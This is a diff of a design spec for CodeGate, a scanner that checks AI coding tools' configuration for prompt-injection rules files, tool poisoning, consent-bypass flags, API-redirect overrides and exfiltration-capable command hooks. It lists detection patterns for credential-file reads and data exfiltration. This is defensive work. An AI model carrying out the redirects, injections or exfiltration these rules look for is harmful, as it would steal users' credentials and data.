+| **Cline** ([rules](https://docs.cline.bot/customization/cline-rules), [hooks](https://docs.cline.bot/customization/hooks), [skills](https://docs.cline.bot/customization/skills), [workflows](https://docs.cline.bot/customization/workflows), [MCP overview](https://docs.cline.bot/mcp/mcp-overview), [MCP config](https://docs.cline.bot/mcp/adding-and-configuring-servers))                                                                                                                                                                                                                                                                                                        | `.cline/settings.json`, `.cline/mcp.json`, `~/.cline/data/settings/cline_mcp_settings.json`, `~/.cline/data/cache/remote_config_*.json` | `.clinerules/**/*.md`, `.clinerules/**/*.txt`, `~/Documents/Cline/Rules/**/*.{md,txt}` | Yes (`.clinerules/hooks/*`, `~/Documents/Cline/Hooks/*`)                           | `.cline/skills/**/*.md`, `.clinerules/skills/**/*.md`, `.clinerules/workflows/**/*.md`, `~/Documents/Cline/Workflows/**/*.md`, `.cline/commands/**/*.md` | MCP marketplace and extensions          | `.cline/mcp.json`, `~/.cline/data/settings/cline_mcp_settings.json`, `~/.cline/data/cache/remote_config_*.json`, VS Code globalStorage `.../cline_mcp_settings.json` | `<execute_command><command>...</command>`, hook scripts, MCP `mcpServers.*.{command,args,url,env,alwaysAllow}`, remote policy fields (`mcpMarketplaceEnabled`, `blockPersonalRemoteMCPServers`, `remoteMCPServers[*].{url,alwaysEnabled,headers}`), auto-approve/yolo settings | Prompt/hook/workflow/MCP execution                                | **L1:** Medium-Strong (official Cline workspace + global rules/hooks/workflows + MCP/remote-config settings coverage) <br> **L2:** Strong on discovered files (markdown workflow command extraction + enterprise MCP policy signals + remote header trust-policy checks + trusted-domain allowlist enforcement for remote URL/header hosts) <br> **L3:** Strong (MCP containers + `remoteMCPServers` URL discovery) | **P1 (Delivered, March 2, 2026):** Organization allowlist enforcement for `remoteMCPServers[*].{url,headers}` trusted domains is active via `trusted_api_domains`. |
+| **Kiro** ([steering](https://kiro.dev/docs/steering/), [hooks](https://kiro.dev/docs/hooks/), [MCP](https://kiro.dev/docs/mcp/), [slash commands](https://kiro.dev/docs/chat/slash-commands/), [extensions](https://kiro.dev/docs/editor/extension-registry/))                                                                                                                                                                                                                                                                                                                                                                                                                          | `.kiro/*` workspace config                                                                                                              | Steering markdown files                                                                | Yes                                                                                | Slash commands + steering/manual context inclusion                                                                                                       | Extension registry                      | Kiro MCP configuration files                                                                                                                                         | steering injection text, hook command strings, MCP `command/url/env`, extension provenance                                                                                                                                                                                     | Session start, slash command, hook event, MCP call                | **L1:** Medium-Strong (AGENTS + config + steering + hooks + project/user MCP + registry paths) <br> **L2:** Strong on discovered files (including publisher trust-policy bypass metadata checks in `extensionsGallery`) <br> **L3:** Strong for declared resources                                                                                                                                                  | **P1 (Delivered, March 2, 2026):** Kiro stricter publisher trust-policy metadata validation is active.                                                             |
+| **JetBrains Junie / AI Assistant** ([guidelines](https://junie.jetbrains.com/docs/customize-guidelines/), [MCP](https://junie.jetbrains.com/docs/model-context-protocol-mcp/), [plugin settings](https://junie.jetbrains.com/docs/junie-plugin-settings/), [project rules](https://www.jetbrains.com/help/ai-assistant/configure-project-rules.html))                                                                                                                                                                                                                                                                                                                                   | IDE-level settings + project/user rule settings                                                                                         | `.aiassistant/rules/*.md` (AI Assistant) and Junie guideline files                     | No standalone hook lifecycle documented                                            | Prompt/rule invocation and command surfaces via IDE assistant                                                                                            | JetBrains plugin ecosystem              | MCP configured via Junie integration settings                                                                                                                        | rule markdown, per-rule activation mode, MCP server command/url/env, permissive tool settings                                                                                                                                                                                  | Chat start, rule attachment, MCP call                             | **L1:** Medium-Strong (project paths + Toolbox/global user-scope Junie/AI Assistant paths + workspace/profile file mappings including `.idea/workspace.xml` and `options/aiAssistant.xml`) <br> **L2:** Medium-Strong on discovered files <br> **L3:** Medium-Strong for declared resources                                                                                                                         | **P1 (Delivered, March 2, 2026):** Broader JetBrains workspace/profile file mapping is active for shared `.idea` and user `options/aiAssistant.xml` surfaces.      |
+| **Zed AI** ([agent panel](https://zed.dev/docs/ai/agent-panel), [rules](https://zed.dev/docs/ai/rules), [MCP](https://zed.dev/docs/ai/mcp), [AI config](https://zed.dev/docs/ai/configuration), [slash commands](https://zed.dev/docs/extensions/slash-commands), [MCP extensions](https://zed.dev/docs/extensions/mcp-extensions))                                                                                                                                                                                                                                                                                                                                                     | Zed settings (`settings.json`)                                                                                                          | Zed AI rules files                                                                     | No dedicated hook lifecycle documented                                             | Slash command extensions                                                                                                                                 | Extension ecosystem + MCP extensions    | `context_servers` in Zed settings                                                                                                                                    | `context_servers.*.{command,args,env}`, rule prompt injection, tool permission defaults                                                                                                                                                                                        | Agent prompt, extension command, MCP/context-server call          | **L1:** Medium-Strong (project + user Zed settings/rules/context-server/extension paths) <br> **L2:** Strong on discovered files (Zed strict attestation/provenance checks plus explicit publisher-scoped ID and publisher-identity mismatch constraints) <br> **L3:** Strong for `context_servers` and MCP key aliases                                                                                             | **P1 (Delivered, March 2, 2026):** Explicit publisher-identity trust constraints tied to Zed extension metadata are active.                                        |
 
 **Implementation priorities from this matrix (practical and build-ready):**
+
 1. **P0 delivered (March 1, 2026):** KB coverage expanded for missing tool families (Gemini, Roo, Cline, Zed, JetBrains Junie) and missing high-risk paths in existing families (Claude `settings.local` + memory files, Codex `AGENTS.md`, Cursor `.cursor/rules/*.mdc`, Windsurf cascade paths, Copilot prompt/chat-mode files, Kiro steering/hooks/MCP).
 2. **P0 delivered (March 1, 2026):** Deep resource extraction generalized beyond `mcpServers` to include `mcp_servers`, `context_servers`, and nested MCP blocks.
 3. **P0 delivered (March 1, 2026):** Consent-bypass static signals expanded for cross-tool auto-approval semantics (`alwaysAllow`, `autoApprove`, `yolo`, trust-all flags).
@@ -457,13 +460,13 @@ Layer 1 uses two complementary strategies:
 
 **Shallow project tree walk:** For detections that require scanning the project tree (symlinks, `.git/hooks/`), CodeGate performs a bounded walk with the following rules:
 
-| Rule | Behaviour |
-|---|---|
-| **Always skip** | `node_modules/`, `.git/objects/`, `.git/refs/`, `dist/`, `build/`, `__pycache__/`, `.venv/`, `vendor/` |
-| **Always include** | `.git/hooks/` (explicitly included despite `.git/` being partially skipped) |
-| **Depth limit** | Default max depth of 5 levels. Configurable via `--max-depth`. |
-| **Symlink resolution** | Resolve all symlinks encountered during the walk. Flag any whose canonical path escapes the project root. Circular symlinks (ELOOP) are caught and reported as an INFO finding: "Circular symlink detected: {path}. Skipped." |
-| **`.gitignore` respect** | Not respected — attackers can gitignore malicious files to hide them from review. CodeGate scans everything within scope. |
+| Rule                     | Behaviour                                                                                                                                                                                                                     |
+| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Always skip**          | `node_modules/`, `.git/objects/`, `.git/refs/`, `dist/`, `build/`, `__pycache__/`, `.venv/`, `vendor/`                                                                                                                        |
+| **Always include**       | `.git/hooks/` (explicitly included despite `.git/` being partially skipped)                                                                                                                                                   |
+| **Depth limit**          | Default max depth of 5 levels. Configurable via `--max-depth`.                                                                                                                                                                |
+| **Symlink resolution**   | Resolve all symlinks encountered during the walk. Flag any whose canonical path escapes the project root. Circular symlinks (ELOOP) are caught and reported as an INFO finding: "Circular symlink detected: {path}. Skipped." |
+| **`.gitignore` respect** | Not respected — attackers can gitignore malicious files to hide them from review. CodeGate scans everything within scope.                                                                                                     |
 
 **Scope guard:** Before starting the walk, CodeGate checks if the scan target is a filesystem root (`/`, `C:\`) or the user's home directory. If so, CodeGate warns: "Scanning {path} would cover your entire filesystem/home directory. This is likely unintended. Use a project directory instead." The user can confirm to proceed. In non-interactive mode, this is an error (exit 3) unless `--force` is passed.
 
@@ -473,14 +476,14 @@ Layer 1 produces a `DiscoveryResult` for each discovered file:
 
 ```typescript
 interface DiscoveryResult {
-  tool: string;            // "claude-code", "cursor", "opencode", etc.
-  configPath: string;      // Relative path: ".claude/settings.json"
-  absolutePath: string;    // Resolved absolute path
+  tool: string; // "claude-code", "cursor", "opencode", etc.
+  configPath: string; // Relative path: ".claude/settings.json"
+  absolutePath: string; // Resolved absolute path
   format: "jsonc" | "json" | "toml" | "yaml" | "dotenv" | "text" | "markdown";
   scope: "project" | "user";
-  riskSurfaces: string[];  // ["env_override", "hooks", "consent_bypass"]
+  riskSurfaces: string[]; // ["env_override", "hooks", "consent_bypass"]
   isSymlink: boolean;
-  symlinkTarget?: string;  // Resolved target if symlink
+  symlinkTarget?: string; // Resolved target if symlink
 }
 ```
 
@@ -499,6 +502,7 @@ When a config file fails to parse (invalid JSON, malformed TOML, corrupt encodin
 Scan configuration files for environment variable overrides affecting network routing or authentication:
 
 **CRITICAL — Credential theft / traffic redirect:**
+
 - `ANTHROPIC_BASE_URL` — redirects all Claude API traffic
 - `ANTHROPIC_BEDROCK_BASE_URL`, `ANTHROPIC_VERTEX_BASE_URL` — cloud variant redirects
 - `OPENAI_BASE_URL`, `OPENAI_API_BASE` — redirects OpenAI-compatible API traffic
@@ -506,6 +510,7 @@ Scan configuration files for environment variable overrides affecting network ro
 - Any `*_BASE_URL`, `*_API_URL`, `*_ENDPOINT` pointing to non-official domains
 
 **Official domain allowlist for URL overrides:**
+
 - Anthropic: `api.anthropic.com`, `*.anthropic.com`
 - OpenAI: `api.openai.com`, `*.openai.azure.com`
 - AWS Bedrock: `*.amazonaws.com`
@@ -514,10 +519,12 @@ Scan configuration files for environment variable overrides affecting network ro
 Any `*_BASE_URL` pointing to a domain NOT in this list is flagged as CRITICAL. `localhost` / `127.0.0.1` are flagged as MEDIUM (likely development, but could be a local interceptor). Users can add trusted domains to the global config via `trusted_api_domains: ["ai-proxy.company.internal"]`.
 
 **HIGH — Tracking / header manipulation:**
+
 - `ANTHROPIC_CUSTOM_HEADERS` — injects arbitrary HTTP headers
 - Any `*_CUSTOM_HEADERS`, `*_EXTRA_HEADERS` pattern
 
 **MEDIUM — Behavioural / billing override:**
+
 - `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `AZURE_OPENAI_API_KEY`, `GOOGLE_AI_API_KEY`, `DEEPSEEK_API_KEY` — overrides the user's API key for an AI tool at project level
 - Only AI-tool-specific credentials are flagged. Generic project variables (`DATABASE_TOKEN`, `JWT_SECRET`, `STRIPE_API_KEY`) are NOT flagged — they are normal project configuration, not attack vectors for AI coding tools. The blocked credential list is maintained in the knowledge base.
 
@@ -526,6 +533,7 @@ Any `*_BASE_URL` pointing to a domain NOT in this list is flagged as CRITICAL. `
 Scan all configuration files for fields that specify commands to be executed:
 
 **MCP Server Definitions (all tools):**
+
 - Any `mcp` config block with `command` array or `type: "local"` / `type: "stdio"`
 - Flag commands not in known-safe allowlist
 - Flag shell interpreters (`bash`, `sh`, `zsh`, `cmd`, `powershell`, `python`, `node`, etc.)
@@ -533,22 +541,26 @@ Scan all configuration files for fields that specify commands to be executed:
 - Flag pipe chains, redirects, semicolons, backticks, `$()` subshell syntax
 
 **LSP Server Definitions (OpenCode):**
+
 - Any `lsp` config block with `command` array
 - Same shell/network checks as MCP
 - Note: lazy trigger (on file access) makes these stealthier
 
 **Formatter Definitions (OpenCode):**
+
 - Any `formatter` config block with `command` array
 - Same checks as MCP/LSP
 - Flag `stdout: "ignore"` and `stderr: "ignore"` (evidence suppression)
 - Note: triggers on every file edit — highest frequency vector
 
 **Hooks (Claude Code):**
+
 - Any `hooks` configuration in `.claude/settings.json`
 - Flag hooks with `SessionStart`, `PreToolUse`, `PostToolUse` matchers
 - Flag hooks containing shell commands, network calls, or data exfiltration patterns
 
 **Custom Commands / Scripts:**
+
 - `commands`, `tasks`, `scripts` config blocks
 - `package.json` lifecycle scripts that execute automatically: `preinstall`, `postinstall`, `prepare`, `prepublish` (supply chain vectors — execute on `npm install`). Standard scripts (`build`, `test`, `start`, `dev`, `lint`) are NOT flagged unless they contain suspicious command patterns (curl piping, encoded payloads, network exfiltration).
 - Git hooks in `.git/hooks/` (pre-commit, post-checkout, post-merge, etc.)
@@ -575,6 +587,7 @@ Scan AI instruction and rule files for suspicious content:
 **Note on `.mdc` format:** Cursor's `.mdc` (Markdown with Context) files contain YAML frontmatter and markdown body. The frontmatter is parsed with the YAML parser for structured field analysis. The markdown body is scanned with the same Unicode/instruction analysis as other rule files.
 
 **Detections:**
+
 - Hidden Unicode characters (zero-width spaces, RTL overrides, homoglyph substitution) — Rules File Backdoor technique
 - Base64-encoded payloads
 - Instructions to ignore previous safety guidelines or system prompts
@@ -619,6 +632,7 @@ CodeGate tracks MCP server configuration hashes between scans to detect silent p
 - If a server is first seen: report `NEW_SERVER` (INFO)
 
 Detection notes:
+
 - State is per-user (shared across projects on the same machine)
 - State updates after each completed scan
 - `codegate scan --reset-state` clears stored state (fresh baseline)
@@ -635,6 +649,7 @@ Depending on the selected subordinate AI tool, fetched code may be sent to that 
 When Layer 2 identifies a config that references an external resource, Layer 3 can fetch it for inspection:
 
 **MCP Server Packages:**
+
 - npm packages referenced via `npx -y <package>` — fetch package metadata and source from npm registry
 - Python packages referenced via `uvx <package>` — fetch from PyPI
 - Git repositories used as MCP servers — clone and inspect
@@ -642,10 +657,12 @@ When Layer 2 identifies a config that references an external resource, Layer 3 c
 **Fetch edge cases:** Private/scoped npm packages requiring authentication will fail to fetch — CodeGate reports "Unable to fetch (authentication required)" and skips Layer 3 for that resource. Packages using GitHub/GitLab URLs instead of registry names are fetched via `git clone --depth 1`. npm registry rate limiting is handled with exponential backoff (max 3 retries).
 
 **Remote MCP/SSE Endpoints:**
+
 - Fetch OpenAPI/tool schemas from declared HTTP/SSE endpoints
 - Inspect tool descriptions for injection patterns (tool poisoning)
 
 **Skill/Plugin Files:**
+
 - Download referenced skill files, templates, or configuration bundles
 - Inspect shell scripts referenced by hooks or formatters
 
@@ -710,11 +727,11 @@ For every meta-agent invocation, CodeGate displays the complete command before e
 
 **Tool-specific invocation patterns:**
 
-| AI Tool | Command Pattern | Safety Flags |
-|---|---|---|
-| Claude Code | `claude --print --max-turns 1 --allowedTools "" "<prompt>"` | Read-only, no tools, single pass |
-| Codex CLI | `codex --quiet --approval-mode never "<prompt>"` | Non-interactive output only. Agent cannot execute any actions requiring approval (file writes, commands, network). |
-| OpenCode (generic pipe mode) | `sh -lc "printf %s '<prompt>' \| opencode --stdin --no-interactive"` | Piped input, non-interactive |
+| AI Tool                      | Command Pattern                                                      | Safety Flags                                                                                                       |
+| ---------------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
+| Claude Code                  | `claude --print --max-turns 1 --allowedTools "" "<prompt>"`          | Read-only, no tools, single pass                                                                                   |
+| Codex CLI                    | `codex --quiet --approval-mode never "<prompt>"`                     | Non-interactive output only. Agent cannot execute any actions requiring approval (file writes, commands, network). |
+| OpenCode (generic pipe mode) | `sh -lc "printf %s '<prompt>' \| opencode --stdin --no-interactive"` | Piped input, non-interactive                                                                                       |
 
 **Example orchestration (full TUI flow):**
 
@@ -782,14 +799,14 @@ Layer 3 operates under strict constraints:
 
 AI analysis is inherently non-deterministic. CodeGate handles failure modes gracefully — meta-agent failures are always non-blocking and Layer 2 static findings remain valid regardless:
 
-| Failure Mode | Handling |
-|---|---|
-| **Parse failure** (AI returns free-text instead of requested JSON) | Report "Layer 3 analysis inconclusive for {resource} — AI returned unparseable output. Manual review recommended." Confidence: LOW. |
-| **AI refusal** (safety filter blocks the analysis prompt) | Report "Layer 3 analysis unavailable — AI tool declined the analysis prompt." Suggest user try with edited prompt or alternative tool. |
-| **Timeout** (AI process exceeds 60 seconds) | Kill process. Report "Layer 3 analysis timed out for {resource}." |
-| **Schema mismatch** (valid JSON but unexpected structure) | Extract whatever fields match expected schema. Report partial findings with LOW confidence. |
-| **Process crash** (non-zero exit code) | Report "Layer 3 analysis failed — AI tool exited with error." Include stderr excerpt. |
-| **Hallucinated findings** | Cannot be detected automatically. All Layer 3 findings are labelled as AI-generated with confidence level. Layer 2 deterministic findings take precedence in all cases. |
+| Failure Mode                                                       | Handling                                                                                                                                                                |
+| ------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Parse failure** (AI returns free-text instead of requested JSON) | Report "Layer 3 analysis inconclusive for {resource} — AI returned unparseable output. Manual review recommended." Confidence: LOW.                                     |
+| **AI refusal** (safety filter blocks the analysis prompt)          | Report "Layer 3 analysis unavailable — AI tool declined the analysis prompt." Suggest user try with edited prompt or alternative tool.                                  |
+| **Timeout** (AI process exceeds 60 seconds)                        | Kill process. Report "Layer 3 analysis timed out for {resource}."                                                                                                       |
+| **Schema mismatch** (valid JSON but unexpected structure)          | Extract whatever fields match expected schema. Report partial findings with LOW confidence.                                                                             |
+| **Process crash** (non-zero exit code)                             | Report "Layer 3 analysis failed — AI tool exited with error." Include stderr excerpt.                                                                                   |
+| **Hallucinated findings**                                          | Cannot be detected automatically. All Layer 3 findings are labelled as AI-generated with confidence level. Layer 2 deterministic findings take precedence in all cases. |
 
 #### 5.3.5 MCP Tool Description Analysis (Safe Acquisition)
 
@@ -810,6 +827,7 @@ Safe acquisition tiers:
    - Still no scanner-triggered stdio execution of unknown commands
 
 Deterministic scans on description text include:
+
 - Sensitive file-read instructions (`~/.ssh`, `.env`, credentials)
 - Exfiltration instructions (send/upload/webhook patterns)
 - Command execution encouragement (`bash -c`, shell instructions)
@@ -825,6 +843,7 @@ CodeGate models installed/available tool sets as a capability graph:
 - `exfiltration_sink`: sends data externally
 
 If an `untrusted_input -> sensitive_access -> exfiltration_sink` chain exists, CodeGate emits:
+
 - `TOXIC_FLOW` (CRITICAL)
 - Chain evidence listing source/sensitive/sink tools
 - OWASP mapping: ASI08 (Cascading Failures)
@@ -842,19 +861,19 @@ Layer 4 transforms CodeGate from a passive scanner into an active security tool.
 
 Each finding type maps to one or more remediation actions:
 
-| Finding Type | Remediation Options |
-|---|---|
-| **ENV_OVERRIDE** (URL redirect) | Remove the override (recommended — tools use correct URLs by default), comment out with warning (JSONC/TOML/YAML/dotenv only) |
-| **ENV_OVERRIDE** (header injection) | Remove the header, comment out with warning (JSONC/TOML/YAML/dotenv only) |
-| **COMMAND_EXEC** (malicious MCP server) | Remove the server entry, replace with known-safe alternative, disable server |
-| **COMMAND_EXEC** (hooks) | Remove the hook, disable hook execution, comment out with warning (JSONC only) |
-| **COMMAND_EXEC** (formatter/LSP) | Remove the entry, replace with known-safe formatter/LSP |
-| **CONSENT_BYPASS** | Set flag to `false`, remove the setting, add explicit server-by-server approval |
-| **RULE_INJECTION** (hidden Unicode) | Strip invisible characters, show cleaned diff for review |
-| **RULE_INJECTION** (malicious instructions) | Remove the instruction block, quarantine the file |
-| **IDE_SETTINGS** (executable path) | Remove the override, reset to default |
-| **SYMLINK_ESCAPE** | Remove the symlink, replace with a placeholder text file (`REMOVED_BY_CODEGATE.txt`) explaining what was removed and why |
-| **GIT_HOOK** (suspicious) | Remove execute permission, quarantine the hook, delete the hook |
+| Finding Type                                | Remediation Options                                                                                                           |
+| ------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| **ENV_OVERRIDE** (URL redirect)             | Remove the override (recommended — tools use correct URLs by default), comment out with warning (JSONC/TOML/YAML/dotenv only) |
+| **ENV_OVERRIDE** (header injection)         | Remove the header, comment out with warning (JSONC/TOML/YAML/dotenv only)                                                     |
+| **COMMAND_EXEC** (malicious MCP server)     | Remove the server entry, replace with known-safe alternative, disable server                                                  |
+| **COMMAND_EXEC** (hooks)                    | Remove the hook, disable hook execution, comment out with warning (JSONC only)                                                |
+| **COMMAND_EXEC** (formatter/LSP)            | Remove the entry, replace with known-safe formatter/LSP                                                                       |
+| **CONSENT_BYPASS**                          | Set flag to `false`, remove the setting, add explicit server-by-server approval                                               |
+| **RULE_INJECTION** (hidden Unicode)         | Strip invisible characters, show cleaned diff for review                                                                      |
+| **RULE_INJECTION** (malicious instructions) | Remove the instruction block, quarantine the file                                                                             |
+| **IDE_SETTINGS** (executable path)          | Remove the override, reset to default                                                                                         |
+| **SYMLINK_ESCAPE**                          | Remove the symlink, replace with a placeholder text file (`REMOVED_BY_CODEGATE.txt`) explaining what was removed and why      |
+| **GIT_HOOK** (suspicious)                   | Remove execute permission, quarantine the hook, delete the hook                                                               |
 
 **Quarantine action:** "Quarantine" moves the file to `.codegate-backup/quarantine/{original-relative-path}` and replaces the original with a placeholder text file: `# This file was quarantined by CodeGate. Reason: {finding description}. Original: .codegate-backup/quarantine/{path}`. Quarantined files are restored by `codegate undo` alongside other remediation reversions.
 
@@ -948,12 +967,12 @@ $ codegate scan . --remediate
 
 #### 5.4.3 Remediation Modes
 
-| Mode | Command | Behaviour |
-|---|---|---|
-| **Interactive** (default) | `codegate scan . --remediate` | Show each fix as diff, ask for approval |
-| **Auto-fix safe** | `codegate scan . --fix-safe` | Automatically apply fixes for CRITICAL findings with unambiguous remediation (remove env redirects, disable consent bypass). Prompt for others. In non-interactive mode (non-TTY), CRITICAL findings are auto-fixed and all other findings are reported but not fixed. Exit code reflects post-remediation state. |
-| **Dry-run** | `codegate scan . --remediate --dry-run` | Show all proposed fixes but write nothing. Useful for CI/CD reporting. |
-| **Generate patch** | `codegate scan . --remediate --patch` | Output a `.patch` file that can be reviewed and applied separately with `git apply`. Patch is written to `codegate-fixes.patch` in the scan target directory. Use `--output <path>` to specify an alternate location. In non-interactive mode with no `--output`, patch is written to stdout for piping. |
+| Mode                      | Command                                 | Behaviour                                                                                                                                                                                                                                                                                                         |
+| ------------------------- | --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Interactive** (default) | `codegate scan . --remediate`           | Show each fix as diff, ask for approval                                                                                                                                                                                                                                                                           |
+| **Auto-fix safe**         | `codegate scan . --fix-safe`            | Automatically apply fixes for CRITICAL findings with unambiguous remediation (remove env redirects, disable consent bypass). Prompt for others. In non-interactive mode (non-TTY), CRITICAL findings are auto-fixed and all other findings are reported but not fixed. Exit code reflects post-remediation state. |
+| **Dry-run**               | `codegate scan . --remediate --dry-run` | Show all proposed fixes but write nothing. Useful for CI/CD reporting.                                                                                                                                                                                                                                            |
+| **Generate patch**        | `codegate scan . --remediate --patch`   | Output a `.patch` file that can be reviewed and applied separately with `git apply`. Patch is written to `codegate-fixes.patch` in the scan target directory. Use `--output <path>` to specify an alternate location. In non-interactive mode with no `--output`, patch is written to stdout for piping.          |
 
 #### 5.4.4 Remediation Safety
 
@@ -997,14 +1016,15 @@ Each finding includes:
 
 - **Terminal (default):** Colour-coded, human-readable with severity indicators
 - **JSON:** Machine-readable for CI/CD integration. Top-level schema:
+
 ```typescript
 interface CodeGateReport {
-  version: string;              // CodeGate version
-  scan_target: string;          // Scanned directory path
-  timestamp: string;            // ISO 8601
-  kb_version: string;           // Knowledge base date
-  tools_detected: string[];     // Installed AI tools
-  findings: Finding[];          // May be empty array
+  version: string; // CodeGate version
+  scan_target: string; // Scanned directory path
+  timestamp: string; // ISO 8601
+  kb_version: string; // Knowledge base date
+  tools_detected: string[]; // Installed AI tools
+  findings: Finding[]; // May be empty array
   summary: {
     total: number;
     by_severity: Record<string, number>;
@@ -1014,19 +1034,21 @@ interface CodeGateReport {
   };
 }
 ```
+
 The `Finding` interface mirrors the fields in 5.5.1 with all fields required except `cve` (nullable), `affected_locations` (nullable), `source_config` (Layer 3 only, nullable), and `remediation_actions` (empty array if not fixable). Suppressed findings include `"suppressed": true`.
+
 - **SARIF:** SARIF v2.1.0 (OASIS standard) for GitHub Code Scanning, VS Code, security tooling integration. Each CodeGate rule maps to a SARIF `reportingDescriptor` in `tool.driver.rules`. Each finding maps to a `result` with `ruleId` (from `rule_id`), `level` (error for CRITICAL/HIGH, warning for MEDIUM, note for LOW/INFO), `message`, and `locations` pointing to the config file and line. The finding fingerprint is emitted in `result.fingerprints.codegateFindingId` and `result.properties.finding_id`. Output is validated against the GitHub SARIF upload schema.
 - **Markdown:** For PR comments or reports
 - **HTML:** Dashboard-style report with expandable details
 
 #### 5.5.3 Exit Codes
 
-| Exit Code | Meaning |
-|---|---|
-| 0 | No unsuppressed findings (SAFE) |
-| 1 | Findings exist, but none are at or above the configured `severity_threshold` (WARNINGS) |
-| 2 | At least one unsuppressed finding is at or above `severity_threshold` (DANGEROUS) |
-| 3 | Scanner error (invalid CLI arguments, unreadable scan directory, corrupt global config, or internal error). Individual file parse failures produce PARSE_ERROR findings and do NOT trigger exit 3 — the scan continues. |
+| Exit Code | Meaning                                                                                                                                                                                                                 |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 0         | No unsuppressed findings (SAFE)                                                                                                                                                                                         |
+| 1         | Findings exist, but none are at or above the configured `severity_threshold` (WARNINGS)                                                                                                                                 |
+| 2         | At least one unsuppressed finding is at or above `severity_threshold` (DANGEROUS)                                                                                                                                       |
+| 3         | Scanner error (invalid CLI arguments, unreadable scan directory, corrupt global config, or internal error). Individual file parse failures produce PARSE_ERROR findings and do NOT trigger exit 3 — the scan continues. |
 
 ### 5.6 User Interaction Modes
 
@@ -1090,14 +1112,14 @@ $ codegate scan ./my-project --format sarif --output codegate.sarif  # write to 
 
 **CI/CD-relevant flags** (see Section 5.8 for complete CLI reference):
 
-| Flag | Purpose |
-|---|---|
-| `--no-tui` | Disable TUI, interactive prompts, and colour. Auto-enabled when stdout is not a TTY. |
-| `--format <type>` | Output format: `terminal` (default), `json`, `sarif`, `markdown`, `html` |
-| `--output <path>` | Write report to file instead of stdout |
-| `--fix-safe` | Auto-fix unambiguous critical findings without prompting |
-| `--dry-run` | Show proposed fixes but write nothing |
-| `--patch` | Generate a `.patch` file for review |
+| Flag              | Purpose                                                                              |
+| ----------------- | ------------------------------------------------------------------------------------ |
+| `--no-tui`        | Disable TUI, interactive prompts, and colour. Auto-enabled when stdout is not a TTY. |
+| `--format <type>` | Output format: `terminal` (default), `json`, `sarif`, `markdown`, `html`             |
+| `--output <path>` | Write report to file instead of stdout                                               |
+| `--fix-safe`      | Auto-fix unambiguous critical findings without prompting                             |
+| `--dry-run`       | Show proposed fixes but write nothing                                                |
+| `--patch`         | Generate a `.patch` file for review                                                  |
 
 #### 5.6.3 `run` Command (Wrapper Mode Behaviour)
 
@@ -1188,6 +1210,7 @@ If `~/.codegate/config.json` does not exist, CodeGate runs with built-in default
 ```
 
 **Configuration notes:**
+
 - `severity_threshold`: Controls exit code calculation and `run` command behaviour. Only findings at or above this severity level contribute to exit code 2 (DANGEROUS). Findings below the threshold are still displayed but marked as "below threshold" and contribute to exit code 1 (WARNINGS) at most.
 - `auto_proceed_below_threshold`: In `run` command flow (`codegate run`), if all findings are below the threshold, skip the confirmation prompt and launch the tool directly. In scan mode, has no effect (all findings are always shown).
 - `scan_state_path`: Optional override for rug-pull baseline storage. Default is `~/.codegate/scan-state.json`. This file is global per user and stores MCP configuration hashes (`CONFIG_CHANGE`, `NEW_SERVER` baseline).
@@ -1212,6 +1235,7 @@ When a config entry contains a command array (e.g., `["npx", "-y", "@anthropic/m
 4. Identifiers are normalised before comparison (case-normalised package/tool names, `node_modules` path extraction, URL normalisation for scan-state IDs including host casing and query-order canonicalisation)
 
 **Examples:**
+
 - `["npx", "-y", "@anthropic/mcp-server-filesystem"]` → matches `@anthropic/mcp-server-filesystem` ✅
 - `["node", "./node_modules/@anthropic/mcp-server-filesystem/index.js"]` → extracts `@anthropic/mcp-server-filesystem` from path ✅
 - `["docker", "run", "mcp-server"]` → `docker` is not a known launcher, so `docker` is the identifier → no allowlist match, flagged for review
@@ -1226,6 +1250,7 @@ When a config entry contains a command array (e.g., `["npx", "-y", "@anthropic/m
 Rules are format-aware. The `query_type` field determines how the file is queried:
 
 **Configuration precedence (highest to lowest):**
+
 1. CLI flags (always win)
 2. Project config (`.codegate.json` in scan target directory)
 3. Global config (`~/.codegate/config.json`)
@@ -1234,6 +1259,7 @@ Rules are format-aware. The `query_type` field determines how the file is querie
 For list fields (`known_safe_mcp_servers`, `suppress_findings`, `trusted_api_domains`), values are merged across all levels. For scalar fields (`severity_threshold`, `output_format`), the highest-precedence value wins. For security, project config CANNOT reduce `blocked_commands` (can only add entries) and CANNOT set `trusted_directories` (global only) — this prevents a malicious repo from disabling its own security checks.
 
 **JSON/JSONC rules** (json_path):
+
 ```json
 {
   "id": "claude-mcp-consent-bypass",
@@ -1252,6 +1278,7 @@ For list fields (`known_safe_mcp_servers`, `suppress_findings`, `trusted_api_dom
 ```
 
 **TOML rules** (toml_path):
+
 ```json
 {
   "id": "codex-mcp-command-exec",
@@ -1270,6 +1297,7 @@ For list fields (`known_safe_mcp_servers`, `suppress_findings`, `trusted_api_dom
 ```
 
 **Dotenv rules** (env_key):
+
 ```json
 {
   "id": "env-base-url-override",
@@ -1287,6 +1315,7 @@ For list fields (`known_safe_mcp_servers`, `suppress_findings`, `trusted_api_dom
 ```
 
 **Text/markdown rules** (text_pattern):
+
 ```json
 {
   "id": "rule-file-hidden-unicode",
@@ -1307,12 +1336,13 @@ For list fields (`known_safe_mcp_servers`, `suppress_findings`, `trusted_api_dom
 
 `file_pattern` is a pipe-separated list of glob patterns. Each pattern is matched against the file's relative path using `fast-glob` semantics. Examples: `.claude/settings*.json` matches both `settings.json` and `settings.local.json`. `.cursorrules|.windsurfrules|CLAUDE.md` matches any of those exact filenames. `.cursor/rules/*.mdc` matches all `.mdc` files in that directory.
 
-| query_type | File formats | Query syntax | Available conditions |
-|---|---|---|---|
-| `json_path` | JSON, JSONC | JSONPath expression (`$.field.subfield`) | `equals_true`, `equals_false`, `exists`, `not_empty`, `matches_regex`, `not_in_allowlist` |
-| `toml_path` | TOML | Dot-separated path (`section.*.field`) | Same as json_path |
-| `env_key` | dotenv (.env) | Pipe-separated key names | `exists`, `matches_regex`, `not_in_allowlist` |
